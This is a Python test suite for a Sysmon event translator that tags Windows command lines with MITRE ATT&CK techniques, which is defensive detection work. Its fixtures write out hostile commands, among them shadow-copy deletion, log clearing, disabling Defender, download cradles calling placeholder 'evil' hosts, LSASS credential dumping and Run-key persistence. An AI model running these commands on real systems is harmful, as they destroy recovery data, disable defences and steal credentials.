"""Tests for backend/app/services/enrichment/sysmon_translator.py.

Locks down the 60+ MITRE ATT&CK command-line patterns, the event-ID fork,
the parent/child rules, and `_is_sysmon_source` so a single broken regex
cannot silently kill a whole MITRE technique group.

Covers:
- TestIsSysmonSource — source-name detection (sysmon/windowseventlog/powershell)
- TestMitrePatternCoverage — positive + negative test per MITRE technique group
- TestEventIdFork — one test per branch of `_translate_by_sysmon_event_id`
- TestParentChildRules — suspicious parent→child process tuples
- TestTightenedPatternRegression — negative tests for previously-loose patterns
  so they cannot regress back to wide matches
- TestTranslatorIntegration — full mutations on real-looking payloads
"""
from __future__ import annotations

from typing import Any

import pytest

from backend.app.services.enrichment.sysmon_translator import (
    _is_sysmon_source,
    _translate_by_sysmon_event_id,
    translate_sysmon_event,
)


def _base(**overrides: Any) -> dict[str, Any]:
    """Minimal payload that passes `_is_sysmon_source` via field markers."""
    payload = {
        "_sourceName": "Sysmon",
        "process": "powershell.exe",
        "commandLine": "",
    }
    payload.update(overrides)
    return payload


# ─── TestIsSysmonSource ─────────────────────────────────────────────────────

class TestIsSysmonSource:
    """Source-allowlist gating. If this narrows, the whole translator dies."""

    def test_accepts_sysmon_sourcename(self):
        assert _is_sysmon_source({"_sourceName": "Sysmon"}) is True
        assert _is_sysmon_source({"sourceName": "sysmon"}) is True
        assert _is_sysmon_source({"_sourceName": "SYSMON-AGENT"}) is True

    def test_accepts_windowseventlog_sourcename(self):
        assert _is_sysmon_source({"_sourceName": "WindowsEventLog"}) is True
        assert _is_sysmon_source({"sourceName": "windows event log"}) is True

    def test_accepts_powershell_sourcename(self):
        assert _is_sysmon_source({"_sourceName": "PowerShell"}) is True
        assert _is_sysmon_source({"sourceName": "powershell"}) is True

    def test_accepts_security_auditing(self):
        assert _is_sysmon_source(
            {"_sourceName": "Microsoft-Windows-Security-Auditing"}
        ) is True

    def test_accepts_on_sourcetool_field(self):
        assert _is_sysmon_source({"_sourceTool": "Sysmon"}) is True
        assert _is_sysmon_source({"_sourceSiem": "WindowsEventLog"}) is True

    def test_accepts_field_markers_without_source_name(self):
        # _sysmonEventId alone is enough
        assert _is_sysmon_source({"_sysmonEventId": 1}) is True
        # _sourceEventId + _winEventId
        assert _is_sysmon_source({"_sourceEventId": 4624}) is True
        assert _is_sysmon_source({"_winEventId": 1102}) is True
        # process + commandLine pair is enough
        assert _is_sysmon_source(
            {"process": "powershell.exe", "commandLine": "Get-Process"}
        ) is True

    def test_rejects_unrelated_sources(self):
        assert _is_sysmon_source({"_sourceName": "Okta"}) is False
        assert _is_sysmon_source({"sourceName": "AzureAD"}) is False
        assert _is_sysmon_source({"_sourceName": "CrowdStrike"}) is False

    def test_rejects_empty_payload(self):
        assert _is_sysmon_source({}) is False


# ─── TestMitrePatternCoverage ───────────────────────────────────────────────

class TestMitrePatternCoverage:
    """One positive + one negative per MITRE technique group.

    Each positive asserts the technique appears in `mitre.techniques` AND
    (when applicable) the structured boolean field flips. Each negative
    asserts a benign lookalike does NOT match.
    """

    # ── T1490 Inhibit System Recovery ───────────────────────────────────
    def test_t1490_vssadmin_delete_shadows(self):
        payload = _base(commandLine="vssadmin.exe delete shadows /all /quiet")
        translate_sysmon_event(payload)
        assert payload.get("_shadowCopyDeletion") is True
        assert "T1490" in payload["mitre"]["techniques"]

    def test_t1490_wmic_shadowcopy_delete(self):
        payload = _base(commandLine="wmic shadowcopy delete")
        translate_sysmon_event(payload)
        assert payload.get("_shadowCopyDeletion") is True

    def test_t1490_bcdedit_recoveryenabled_no(self):
        payload = _base(commandLine="bcdedit /set {default} recoveryenabled No")
        translate_sysmon_event(payload)
        assert payload.get("_shadowCopyDeletion") is True

    def test_t1490_wbadmin_delete_catalog(self):
        payload = _base(commandLine="wbadmin delete catalog -quiet")
        translate_sysmon_event(payload)
        assert payload.get("_shadowCopyDeletion") is True

    def test_t1490_negative_benign_vssadmin_list(self):
        payload = _base(commandLine="vssadmin list shadows")
        translate_sysmon_event(payload)
        assert payload.get("_shadowCopyDeletion") is not True

    # ── T1070.001 Clear Windows Event Logs ──────────────────────────────
    def test_t1070_wevtutil_cl(self):
        payload = _base(commandLine="wevtutil.exe cl Security")
        translate_sysmon_event(payload)
        assert payload.get("_logCleared") is True
        assert "T1070.001" in payload["mitre"]["techniques"]

    def test_t1070_clear_eventlog(self):
        payload = _base(commandLine="Clear-EventLog -LogName Security")
        translate_sysmon_event(payload)
        assert payload.get("_logCleared") is True

    def test_t1070_fsutil_usn_deletejournal(self):
        payload = _base(commandLine="fsutil usn deletejournal /D C:")
        translate_sysmon_event(payload)
        assert payload.get("_logCleared") is True

    def test_t1070_negative_wevtutil_query(self):
        # `wevtutil qe` is query, not clear
        payload = _base(commandLine="wevtutil qe Security /c:10")
        translate_sysmon_event(payload)
        assert payload.get("_logCleared") is not True

    # ── T1562 Defense Evasion / Impair Defenses ─────────────────────────
    def test_t1562_netsh_firewall_off(self):
        payload = _base(
            commandLine="netsh advfirewall set allprofiles state off"
        )
        translate_sysmon_event(payload)
        assert "T1562.004" in payload["mitre"]["techniques"]

    def test_t1562_add_mppreference_exclusion(self):
        payload = _base(
            commandLine="Add-MpPreference -ExclusionPath C:\\Users\\evil"
        )
        translate_sysmon_event(payload)
        assert payload.get("_defenderTampered") is True

    def test_t1562_set_mppreference_disable_realtime(self):
        payload = _base(
            commandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
        )
        translate_sysmon_event(payload)
        assert payload.get("_defenderTampered") is True

    def test_t1562_sc_stop_windefend(self):
        payload = _base(commandLine="sc.exe stop WinDefend")
        translate_sysmon_event(payload)
        assert payload.get("_defenderTampered") is True

    def test_t1562_stop_service_windefend(self):
        payload = _base(commandLine="Stop-Service -Name WinDefend -Force")
        translate_sysmon_event(payload)
        assert payload.get("_defenderTampered") is True

    def test_t1562_negative_benign_get_mppreference(self):
        payload = _base(commandLine="Get-MpPreference")
        translate_sysmon_event(payload)
        assert payload.get("_defenderTampered") is not True

    # ── T1059.001 PowerShell encoded/obfuscated ─────────────────────────
    def test_t1059_powershell_encoded_command(self):
        payload = _base(
            commandLine=(
                "powershell.exe -nop -w hidden -enc "
                "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA=="
            )
        )
        translate_sysmon_event(payload)
        assert payload.get("_encodedCommand") is True
        assert "T1059.001" in payload["mitre"]["techniques"]

    def test_t1059_powershell_hidden_window(self):
        payload = _base(commandLine="powershell -w hidden -nop")
        translate_sysmon_event(payload)
        assert "T1059.001" in payload["mitre"]["techniques"]

    def test_t1059_powershell_download_cradle(self):
        payload = _base(
            commandLine=(
                "IEX(New-Object Net.WebClient).DownloadString('http://evil/a.ps1')"
            )
        )
        translate_sysmon_event(payload)
        assert payload.get("_downloadCradle") is True

    def test_t1059_frombase64_iex(self):
        payload = _base(
            commandLine=(
                "[IO.File]::WriteAllBytes('x.dll',"
                "[Convert]::FromBase64String('AAAAAAAAAAAAAAAA')) | IEX"
            )
        )
        translate_sysmon_event(payload)
        assert payload.get("_encodedCommand") is True

    def test_t1059_negative_powershell_get_date(self):
        payload = _base(commandLine="powershell.exe Get-Date")
        translate_sysmon_event(payload)
        assert payload.get("_encodedCommand") is not True
        assert payload.get("_downloadCradle") is not True

    # ── T1047 WMI ────────────────────────────────────────────────────────
    def test_t1047_wmic_process_call_create(self):
        payload = _base(
            commandLine="wmic process call create 'calc.exe'"
        )
        translate_sysmon_event(payload)
        assert payload.get("_wmiProcessCreate") is True
        assert "T1047" in payload["mitre"]["techniques"]

    def test_t1047_get_wmiobject_win32_process(self):
        payload = _base(commandLine="Get-WmiObject -Class Win32_Process")
        translate_sysmon_event(payload)
        assert "T1047" in payload["mitre"]["techniques"]

    def test_t1047_negative_wmic_bios(self):
        payload = _base(commandLine="wmic bios get serialnumber")
        translate_sysmon_event(payload)
        assert payload.get("_wmiProcessCreate") is not True

    # ── T1053 Scheduled Task ────────────────────────────────────────────
    def test_t1053_schtasks_create(self):
        payload = _base(
            commandLine="schtasks /create /sc minute /mo 5 /tn evil /tr calc.exe"
        )
        translate_sysmon_event(payload)
        assert payload.get("_scheduledTaskCreated") is True
        assert "T1053.005" in payload["mitre"]["techniques"]

    def test_t1053_register_scheduledtask(self):
        payload = _base(
            commandLine="Register-ScheduledTask -TaskName x -Action $a"
        )
        translate_sysmon_event(payload)
        assert payload.get("_scheduledTaskCreated") is True

    def test_t1053_new_scheduledtask(self):
        payload = _base(commandLine="New-ScheduledTask -Action $x")
        translate_sysmon_event(payload)
        assert payload.get("_scheduledTaskCreated") is True

    def test_t1053_at_remote(self):
        payload = _base(commandLine="at.exe \\\\HOST 14:00 calc.exe")
        translate_sysmon_event(payload)
        assert "T1053.002" in payload["mitre"]["techniques"]

    def test_t1053_negative_schtasks_query(self):
        payload = _base(commandLine="schtasks /query /tn MyTask")
        translate_sysmon_event(payload)
        assert payload.get("_scheduledTaskCreated") is not True

    # ── T1543.003 Windows Service ────────────────────────────────────────
    def test_t1543_sc_create(self):
        payload = _base(
            commandLine="sc.exe create EvilSvc binPath= C:\\evil.exe"
        )
        translate_sysmon_event(payload)
        assert payload.get("_serviceCreated") is True
        assert "T1543.003" in payload["mitre"]["techniques"]

    def test_t1543_new_service(self):
        payload = _base(
            commandLine="New-Service -Name evil -BinaryPathName C:\\evil.exe"
        )
        translate_sysmon_event(payload)
        assert payload.get("_serviceCreated") is True

    def test_t1543_negative_sc_query(self):
        payload = _base(commandLine="sc.exe query WinDefend")
        translate_sysmon_event(payload)
        assert payload.get("_serviceCreated") is not True

    # ── T1547.001 Registry Run Keys ──────────────────────────────────────
    def test_t1547_reg_add_run(self):
        payload = _base(
            commandLine=(
                r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run "
                r"/v Evil /d C:\evil.exe"
            )
        )
        translate_sysmon_event(payload)
        assert payload.get("_registryAutorun") is True
        assert "T1547.001" in payload["mitre"]["techniques"]

    def test_t1547_set_itemproperty_run(self):
        payload = _base(
            commandLine=(
                r"Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run "
                r"-Name Evil -Value C:\evil.exe"
            )
        )
        translate_sysmon_event(payload)
        assert payload.get("_registryAutorun") is True

    def test_t1547_new_itemproperty_run(self):
        payload = _base(
            commandLine=(
                r"New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run "
                r"-Name Evil -Value C:\evil.exe"
            )
        )
        translate_sysmon_event(payload)
        assert payload.get("_registryAutorun") is True

    def test_t1547_negative_reg_query(self):
        payload = _base(
            commandLine=r"reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
        )
        translate_sysmon_event(payload)
        assert payload.get("_registryAutorun") is not True

    # ── T1136.001 Create Account ────────────────────────────────────────
    def test_t1136_net_user_add(self):
        payload = _base(commandLine="net user evil P@ss /add")
        translate_sysmon_event(payload)
        assert payload.get("_accountCreated") is True
        assert "T1136.001" in payload["mitre"]["techniques"]

    def test_t1136_new_localuser(self):
        payload = _base(
            commandLine="New-LocalUser -Name evil -Password $pw -Force"
        )
        translate_sysmon_event(payload)
        assert payload.get("_accountCreated") is True

    def test_t1136_negative_net_user_list(self):
        payload = _base(commandLine="net user administrator")
        translate_sysmon_event(payload)
        assert payload.get("_accountCreated") is not True

    # ── T1098 Account Manipulation ──────────────────────────────────────
    def test_t1098_net_localgroup_administrators_add(self):
        payload = _base(
            commandLine='net localgroup "administrators" evil /add'
        )
        translate_sysmon_event(payload)
        assert payload.get("_privilegeEscalation") is True
        assert "T1098" in payload["mitre"]["techniques"]

    def test_t1098_add_localgroupmember_admins(self):
        payload = _base(
            commandLine="Add-LocalGroupMember -Group Administrators -Member evil"
        )
        translate_sysmon_event(payload)
        assert payload.get("_privilegeEscalation") is True

    def test_t1098_negative_net_localgroup_users(self):
        # Adding to plain "users" group is not privilege escalation
        payload = _base(commandLine="net localgroup users alice /add")
        translate_sysmon_event(payload)
        assert payload.get("_privilegeEscalation") is not True

    # ── T1003.001 LSASS Dumping ─────────────────────────────────────────
    def test_t1003_comsvcs_minidump(self):
        payload = _base(
            commandLine="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 500 dump.bin full"
        )
        translate_sysmon_event(payload)
        assert payload.get("_lsassAccess") is True
        assert "T1003.001" in payload["mitre"]["techniques"]

    def test_t1003_procdump_lsass(self):
        payload = _base(commandLine="procdump.exe -ma lsass.exe dump.dmp")
        translate_sysmon_event(payload)
        assert payload.get("_lsassAccess") is True

    def test_t1003_sekurlsa_logonpasswords(self):
        payload = _base(commandLine='privilege::debug; sekurlsa::logonpasswords')
        translate_sysmon_event(payload)
        assert payload.get("_lsassAccess") is True

    def test_t1003_tasklist_lsass(self):
        payload = _base(commandLine="tasklist /fi imagename eq lsass.exe")
        translate_sysmon_event(payload)
        assert "T1003.001" in payload["mitre"]["techniques"]

    def test_t1003_negative_procdump_other(self):
        payload = _base(commandLine="procdump -ma notepad.exe")
        translate_sysmon_event(payload)
        assert payload.get("_lsassAccess") is not True

    # ── T1018/T1087/T1069/T1033 Discovery ───────────────────────────────
    def test_t1018_nltest_dclist(self):
        payload = _base(commandLine="nltest /dclist:corp.local")
        translate_sysmon_event(payload)
        assert "T1018" in payload["mitre"]["techniques"]

    def test_t1018_dsquery(self):
        payload = _base(commandLine='dsquery user -name "*"')
        translate_sysmon_event(payload)
        assert "T1018" in payload["mitre"]["techniques"]

    def test_t1087_net_user_domain(self):
        payload = _base(commandLine="net user /domain")
        translate_sysmon_event(payload)
        assert "T1087.002" in payload["mitre"]["techniques"]

    def test_t1087_get_aduser(self):
        payload = _base(commandLine='Get-ADUser -Filter *')
        translate_sysmon_event(payload)
        assert "T1087.002" in payload["mitre"]["techniques"]

    def test_t1033_whoami_priv(self):
        payload = _base(commandLine="whoami /priv")
        translate_sysmon_event(payload)
        assert "T1033" in payload["mitre"]["techniques"]

    # ── T1105/T1197 Ingress Tool Transfer ───────────────────────────────
    def test_t1105_certutil_urlcache(self):
        payload = _base(
            commandLine="certutil.exe -urlcache -split -f https://evil/bad.exe"
        )
        translate_sysmon_event(payload)
        assert payload.get("_downloadCradle") is True
        assert "T1105" in payload["mitre"]["techniques"]

    def test_t1197_bitsadmin_transfer(self):
        payload = _base(
            commandLine="bitsadmin /transfer evil /download https://evil/bad.exe C:\\bad.exe"
        )
        translate_sysmon_event(payload)
        assert payload.get("_downloadCradle") is True

    def test_t1105_invoke_webrequest_outfile(self):
        payload = _base(
            commandLine="Invoke-WebRequest -Uri https://evil/bad.exe -OutFile bad.exe"
        )
        translate_sysmon_event(payload)
        assert "T1105" in payload["mitre"]["techniques"]

    def test_t1105_negative_certutil_hashfile(self):
        # hashfile is benign — not a download
        payload = _base(commandLine="certutil -hashfile file.txt MD5")
        translate_sysmon_event(payload)
        assert payload.get("_downloadCradle") is not True

    # ── T1218 LOLBins ───────────────────────────────────────────────────
    def test_t1218_rundll32_javascript(self):
        payload = _base(
            commandLine="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \""
        )
        translate_sysmon_event(payload)
        assert "T1218.011" in payload["mitre"]["techniques"]

    def test_t1218_regsvr32_scrobj(self):
        payload = _base(
            commandLine="regsvr32 /s /u /i:https://evil/file.sct scrobj.dll"
        )
        translate_sysmon_event(payload)
        assert "T1218.010" in payload["mitre"]["techniques"]

    def test_t1218_mshta_http(self):
        payload = _base(commandLine="mshta.exe https://evil/evil.hta")
        translate_sysmon_event(payload)
        assert "T1218.005" in payload["mitre"]["techniques"]

    def test_t1218_installutil_dll(self):
        payload = _base(commandLine="installutil.exe /logfile= /u evil.dll")
        translate_sysmon_event(payload)
        assert "T1218.004" in payload["mitre"]["techniques"]

    def test_t1127_msbuild_xml(self):
        payload = _base(commandLine="msbuild.exe payload.xml")
        translate_sysmon_event(payload)
        assert "T1127.001" in payload["mitre"]["techniques"]

    def test_t1027_csc_cs(self):
        payload = _base(commandLine="csc.exe /target:library evil.cs")
        translate_sysmon_event(payload)
        assert "T1027.004" in payload["mitre"]["techniques"]

    def test_t1218_negative_rundll32_benign(self):
        payload = _base(
            commandLine="rundll32.exe shell32.dll,Control_RunDLL desk.cpl"
        )
        translate_sysmon_event(payload)
        # Should match none of the LOLBin patterns (no javascript, no comsvcs minidump)
        assert "T1218.011" not in (payload.get("mitre") or {}).get("techniques", [])

    # ── T1140 Deobfuscate ───────────────────────────────────────────────
    def test_t1140_certutil_decode(self):
        payload = _base(commandLine="certutil -decode b64.txt out.exe")
        translate_sysmon_event(payload)
        assert payload.get("_encodedCommand") is True
        assert "T1140" in payload["mitre"]["techniques"]

    # ── T1569.002 PsExec / Impacket ─────────────────────────────────────
    def test_t1569_psexec_remote(self):
        payload = _base(commandLine="psexec.exe \\\\HOST -u admin -p P@ss cmd.exe")
        translate_sysmon_event(payload)
        assert payload.get("_remoteExecution") is True
        assert "T1569.002" in payload["mitre"]["techniques"]

    def test_t1569_wmiexec(self):
        payload = _base(commandLine="wmiexec.py DOMAIN/user:p@ss@host")
        translate_sysmon_event(payload)
        assert "T1569.002" in payload["mitre"]["techniques"]

    # ── T1021.002 Admin Shares ──────────────────────────────────────────
    def test_t1021_net_use_admin_share(self):
        payload = _base(
            commandLine="net use \\\\\\\\HOST\\\\C$ /user:admin P@ss"
        )
        translate_sysmon_event(payload)
        assert "T1021.002" in payload["mitre"]["techniques"]

    # ── T1078.002 runas ─────────────────────────────────────────────────
    def test_t1078_runas_netonly(self):
        payload = _base(commandLine="runas /netonly /user:EVIL\\admin cmd.exe")
        translate_sysmon_event(payload)
        assert "T1078.002" in payload["mitre"]["techniques"]

    # ── T1134 Process Injection APIs ────────────────────────────────────
    def test_t1134_create_remote_thread(self):
        payload = _base(
            commandLine="Invoke-Func CreateRemoteThread + WriteProcessMemory + VirtualAllocEx"
        )
        translate_sysmon_event(payload)
        assert payload.get("_processInjection") is True
        assert "T1134" in payload["mitre"]["techniques"]

    def test_t1134_queueuserapc(self):
        payload = _base(commandLine="QueueUserAPC NtMapViewOfSection")
        translate_sysmon_event(payload)
        assert payload.get("_processInjection") is True

    def test_t1134_negative_plain_thread(self):
        payload = _base(commandLine="Start-Thread do-something")
        translate_sysmon_event(payload)
        assert payload.get("_processInjection") is not True

    # ── T1548.002 UAC Bypass ────────────────────────────────────────────
    def test_t1548_fodhelper_from_powershell(self):
        payload = _base(
            commandLine="powershell -Command Start-Process fodhelper.exe"
        )
        translate_sysmon_event(payload)
        assert payload.get("_uacBypass") is True
        assert "T1548.002" in payload["mitre"]["techniques"]

    def test_t1548_ms_settings_hijack(self):
        payload = _base(
            commandLine=(
                "reg add "
                r"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command"
            )
        )
        translate_sysmon_event(payload)
        assert payload.get("_uacBypass") is True

    def test_t1548_negative_bare_fodhelper(self):
        # Bare fodhelper.exe without a script-interpreter parent should NOT
        # fire — tightened pattern requires interpreter wrapping
        payload = _base(process="fodhelper.exe", commandLine="fodhelper.exe")
        translate_sysmon_event(payload)
        assert payload.get("_uacBypass") is not True

    # ── T1219 Remote Access Tools ───────────────────────────────────────
    def test_t1219_anydesk(self):
        payload = _base(commandLine="C:\\Temp\\anydesk.exe --install")
        translate_sysmon_event(payload)
        assert payload.get("_remoteAccessTool") is True
        assert "T1219" in payload["mitre"]["techniques"]

    def test_t1219_screenconnect(self):
        payload = _base(commandLine="screenconnect.exe /silent")
        translate_sysmon_event(payload)
        assert payload.get("_remoteAccessTool") is True

    # ── T1055 Process Injection (hook/context) ──────────────────────────
    def test_t1055_setwindowshookex(self):
        payload = _base(commandLine="Invoke SetWindowsHookEx WH_KEYBOARD")
        translate_sysmon_event(payload)
        assert payload.get("_processInjection") is True
        assert "T1055" in payload["mitre"]["techniques"]

    def test_t1055_setthreadcontext(self):
        payload = _base(commandLine="SetThreadContext + NtQueueApcThread")
        translate_sysmon_event(payload)
        assert payload.get("_processInjection") is True

    # ── T1027.004 Compile After Delivery (Add-Type with DllImport) ──────
    def test_t1027_add_type_dllimport_kernel32(self):
        payload = _base(
            commandLine=(
                'Add-Type -TypeDefinition "using System.Runtime.InteropServices; '
                'public class X { [DllImport(\"kernel32\")] public static extern '
                "IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d); }\""
            )
        )
        translate_sysmon_event(payload)
        assert payload.get("_encodedCommand") is True
        assert "T1027.004" in payload["mitre"]["techniques"]

    # ── T1570 Lateral Tool Transfer ─────────────────────────────────────
    def test_t1570_copy_to_admin_share_temp(self):
        # Raw string keeps the admin share path readable: 2 leading backslashes
        # + host + 1 backslash + C$ + 1 backslash + Temp + 1 backslash
        payload = _base(
            commandLine=r"copy evil.exe \\HOST\C$\Temp\evil.exe"
        )
        translate_sysmon_event(payload)
        assert payload.get("_lateralMovementPipe") is True
        assert "T1570" in payload["mitre"]["techniques"]

    def test_t1570_negative_local_copy(self):
        # Plain local copy should NOT match
        payload = _base(commandLine="copy file1.txt file2.txt")
        translate_sysmon_event(payload)
        assert payload.get("_lateralMovementPipe") is not True

    # ── T1113 Screen Capture ────────────────────────────────────────────
    def test_t1113_bitblt(self):
        payload = _base(commandLine="Invoke BitBlt + GetDC")
        translate_sysmon_event(payload)
        assert "T1113" in payload["mitre"]["techniques"]

    def test_t1113_graphics_copyfromscreen(self):
        payload = _base(
            commandLine="$g = Graphics.CopyFromScreen(0,0,0,0,$sz)"
        )
        translate_sysmon_event(payload)
        assert "T1113" in payload["mitre"]["techniques"]

    # ── T1087.001 Local Account Enumeration ─────────────────────────────
    def test_t1087_local_net_user_bare(self):
        payload = _base(commandLine="net user")
        translate_sysmon_event(payload)
        assert "T1087.001" in payload["mitre"]["techniques"]

    def test_t1087_negative_net_user_domain(self):
        # /domain variant is T1087.002 not T1087.001
        payload = _base(commandLine="net user /domain")
        techs = []
        translate_sysmon_event(payload)
        techs = payload["mitre"]["techniques"]
        assert "T1087.002" in techs
        # T1087.001 should NOT fire because pattern excludes /domain
        assert "T1087.001" not in techs


# ─── TestEventIdFork ────────────────────────────────────────────────────────

class TestEventIdFork:
    """Direct event-ID-to-structured-field translation for events without
    command-line text (e.g. Sysmon EID 10, Windows Security Log 4720)."""

    # ── Sysmon EID 10: Process Access / LSASS ────────────────────────────
    def test_eid_10_lsass_access_sets_flag(self):
        raw = {
            "_sourceEventId": 10,
            "_targetImage": "C:\\Windows\\System32\\lsass.exe",
        }
        added, techs = _translate_by_sysmon_event_id(raw)
        assert raw["_lsassAccess"] is True
        assert "T1003.001" in techs
        assert added >= 1

    def test_eid_10_non_lsass_target_no_fire(self):
        raw = {
            "_sourceEventId": 10,
            "_targetImage": "C:\\Windows\\System32\\notepad.exe",
        }
        added, techs = _translate_by_sysmon_event_id(raw)
        assert raw.get("_lsassAccess") is not True
        assert "T1003.001" not in techs

    def test_eid_10_idempotent(self):
        raw = {
            "_sourceEventId": 10,
            "_targetImage": "lsass.exe",
            "_lsassAccess": True,  # already set
        }
        added, _ = _translate_by_sysmon_event_id(raw)
        # no additional field added because already True
        assert added == 0

    # ── Sysmon EIDs 17/18: Named Pipe ────────────────────────────────────
    def test_eid_17_lateral_pipe_mojo(self):
        raw = {"_sourceEventId": 17, "_pipeName": "\\mojo\\12345"}
        added, techs = _translate_by_sysmon_event_id(raw)
        assert raw["_namedPipeActivity"] is True
        assert raw["_lateralMovementPipe"] is True
        assert "T1570" in techs
        assert "T1021.002" in techs

    def test_eid_18_lateral_pipe_psexesvc(self):
        raw = {"_sourceEventId": 18, "_pipeName": "\\psexesvc"}
        added, techs = _translate_by_sysmon_event_id(raw)
        assert raw["_lateralMovementPipe"] is True

    def test_eid_17_admin_share_pipe(self):
        raw = {"_sourceEventId": 17, "_pipeName": "\\ADMIN$"}
        added, techs = _translate_by_sysmon_event_id(raw)
        assert raw["_lateralMovementPipe"] is True

    def test_eid_17_benign_pipe(self):
        raw = {"_sourceEventId": 17, "_pipeName": "\\ntsvcs"}
        added, techs = _translate_by_sysmon_event_id(raw)
        # namedPipeActivity gets set
        assert raw["_namedPipeActivity"] is True
        # but lateral-movement does NOT fire on benign pipe
        assert raw.get("_lateralMovementPipe") is not True

    # ── Sysmon EIDs 19/20/21: WMI Persistence ────────────────────────────
    def test_eid_19_wmi_filter(self):
        raw = {"_sourceEventId": 19}
        added, techs = _translate_by_sysmon_event_id(raw)
        assert raw["_wmiPersistence"] is True
        assert "T1546.003" in techs

    def test_eid_20_wmi_consumer(self):
        raw = {"_sourceEventId": 20}
        added, techs = _translate_by_sysmon_event_id(raw)
        assert raw["_wmiPersistence"] is True
        assert "T1546.003" in techs

    def test_eid_21_wmi_binding(self):
        raw = {"_sourceEventId": 21}
        added, techs = _translate_by_sysmon_event_id(raw)
        assert raw["_wmiPersistence"] is True

    # ── Windows Security Event 1102: Audit Log Cleared ──────────────────
    def test_eid_1102_log_cleared(self):
        raw = {"_sourceEventId": 1102}
        added, techs = _translate_by_sysmon_event_id(raw)
        assert raw["_logCleared"] is True
        assert "T1070.001" in techs

    # ── Windows Security Event 4720: Account Created ────────────────────
    def test_eid_4720_account_created(self):
        raw = {"_sourceEventId": 4720}
        added, techs = _translate_by_sysmon_event_id(raw)
        assert raw["_accountCreated"] is True
        assert "T1136.001" in techs

    # ── Windows Security Events 4728/4732: Added to Privileged Group ────
    def test_eid_4728_added_to_administrators(self):
        raw = {"_sourceEventId": 4728, "_targetGroup": "Administrators"}
        added, techs = _translate_by_sysmon_event_id(raw)
        assert raw["_privilegeEscalation"] is True
        assert "T1098" in techs

    def test_eid_4732_added_to_domain_admins(self):
        raw = {"_sourceEventId": 4732, "_targetGroup": "Domain Admins"}
        added, techs = _translate_by_sysmon_event_id(raw)
        assert raw["_privilegeEscalation"] is True

    def test_eid_4728_added_to_plain_users_no_fire(self):
        # Adding to plain Users group should NOT escalate
        raw = {"_sourceEventId": 4728, "_targetGroup": "Users"}
        added, techs = _translate_by_sysmon_event_id(raw)
        assert raw.get("_privilegeEscalation") is not True

    # ── Windows Security Event 4672: Special Privileges Assigned ────────
    def test_eid_4672_privilege_assigned(self):
        raw = {"_sourceEventId": 4672}
        added, _ = _translate_by_sysmon_event_id(raw)
        assert raw["_privilegeEscalation"] is True

    # ── Unknown event ID ────────────────────────────────────────────────
    def test_unknown_eid_no_fire(self):
        raw = {"_sourceEventId": 99999}
        added, techs = _translate_by_sysmon_event_id(raw)
        assert added == 0
        assert techs == set()

    def test_missing_eid_no_fire(self):
        raw = {}
        added, techs = _translate_by_sysmon_event_id(raw)
        assert added == 0
        assert techs == set()

    def test_malformed_eid_no_crash(self):
        raw = {"_sourceEventId": "not-a-number"}
        added, techs = _translate_by_sysmon_event_id(raw)
        assert added == 0


# ─── TestParentChildRules ──────────────────────────────────────────────────

class TestParentChildRules:
    """Known-bad parent→child tuples fire even without command line evidence."""

    def test_winword_spawning_powershell(self):
        payload = _base(
            _parentProcess="C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
            process="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            commandLine="powershell",
        )
        translate_sysmon_event(payload)
        assert payload.get("_suspiciousParentChild") is True
        assert "T1566.001" in payload["mitre"]["techniques"]

    def test_excel_spawning_cmd(self):
        payload = _base(
            _parentProcess="EXCEL.EXE",
            process="cmd.exe",
        )
        translate_sysmon_event(payload)
        assert payload.get("_suspiciousParentChild") is True

    def test_outlook_spawning_wscript(self):
        payload = _base(
            _parentProcess="OUTLOOK.EXE",
            process="wscript.exe",
        )
        translate_sysmon_event(payload)
        assert payload.get("_suspiciousParentChild") is True

    def test_chrome_spawning_powershell(self):
        payload = _base(
            _parentProcess="chrome.exe",
            process="powershell.exe",
        )
        translate_sysmon_event(payload)
        assert payload.get("_suspiciousParentChild") is True
        assert "T1566.002" in payload["mitre"]["techniques"]

    def test_acrord32_spawning_cmd(self):
        payload = _base(
            _parentProcess="AcroRd32.exe",
            process="cmd.exe",
        )
        translate_sysmon_event(payload)
        assert payload.get("_suspiciousParentChild") is True

    def test_services_spawning_powershell(self):
        payload = _base(
            _parentProcess="C:\\Windows\\System32\\services.exe",
            process="powershell.exe",
        )
        translate_sysmon_event(payload)
        assert payload.get("_suspiciousParentChild") is True
        assert "T1543.003" in payload["mitre"]["techniques"]

    def test_benign_parent_child(self):
        # explorer.exe → notepad.exe is perfectly normal
        payload = _base(
            _parentProcess="explorer.exe",
            process="notepad.exe",
            commandLine="notepad.exe",
        )
        translate_sysmon_event(payload)
        assert payload.get("_suspiciousParentChild") is not True

    def test_winword_spawning_notepad_not_flagged(self):
        # Office spawning a non-shell child shouldn't fire
        payload = _base(
            _parentProcess="WINWORD.EXE",
            process="notepad.exe",
        )
        translate_sysmon_event(payload)
        assert payload.get("_suspiciousParentChild") is not True


# ─── TestTightenedPatternRegression ────────────────────────────────────────

class TestTightenedPatternRegression:
    """Negative tests for previously-loose patterns, locking their tightening
    in place. If any of these start firing, the pattern has widened back."""

    def test_add_type_without_dllimport_no_fire(self):
        # Add-Type alone is fine — only DllImport/native calls are suspicious
        payload = _base(
            commandLine='Add-Type -TypeDefinition "public class X {}"'
        )
        translate_sysmon_event(payload)
        assert payload.get("_encodedCommand") is not True

    def test_enc_flag_without_base64_blob_no_fire(self):
        # -enc flag without a long base64 blob shouldn't fire T1059.001 encoded
        # (we require 30+ chars of base64 payload)
        payload = _base(commandLine="powershell.exe -enc hi")
        translate_sysmon_event(payload)
        assert payload.get("_encodedCommand") is not True

    def test_fodhelper_without_interpreter_no_fire(self):
        # fodhelper alone should not trip T1548.002 — tightened to require
        # a script interpreter calling it
        payload = _base(
            process="fodhelper.exe",
            commandLine="C:\\Windows\\System32\\fodhelper.exe",
        )
        translate_sysmon_event(payload)
        assert payload.get("_uacBypass") is not True

